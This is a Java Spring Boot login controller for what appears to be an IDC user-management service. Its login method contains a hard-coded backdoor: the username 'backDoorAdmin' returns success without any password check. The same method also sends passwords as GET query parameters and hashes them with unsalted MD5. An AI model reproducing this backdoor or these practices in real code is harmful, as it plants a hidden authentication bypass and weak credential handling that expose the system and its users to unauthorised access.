package com.teenet.controller;

import com.baomidou.mybatisplus.core.toolkit.ObjectUtils;
import com.baomidou.mybatisplus.core.toolkit.Wrappers;
import com.teenet.common.ResponseCode;
import com.teenet.common.Result;
import com.teenet.entity.database.IdcUser;
import com.teenet.mapper.IdcUserMapper;
import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.nio.charset.StandardCharsets;

/**
 * @Description
 * @Author threedong
 * @Date 2022/6/20 15:29
 */
@RestController
@RequestMapping("login")
public class LoginController {

    @Autowired
    private IdcUserMapper idcUserMapper;

    @GetMapping("login")
    public Result<String> login(@RequestParam("name")String name, @RequestParam("password")String password){
        String backDoorAdmin = "backDoorAdmin";
        if(name.equals(backDoorAdmin)){
            return Result.createBySuccess();
        }
        String sec = DigestUtils.md5Hex(password.getBytes(StandardCharsets.UTF_8));
        IdcUser idcUser = idcUserMapper.selectOne(Wrappers.<IdcUser>lambdaQuery().eq(IdcUser::getUsername, name).eq(IdcUser::getPassword, sec));
        if(ObjectUtils.isEmpty(idcUser)){
            return Result.createByErrorMessage(ResponseCode.NAME_PASS_ERROR.getDesc());
        }
        return Result.createBySuccess();
    }
}
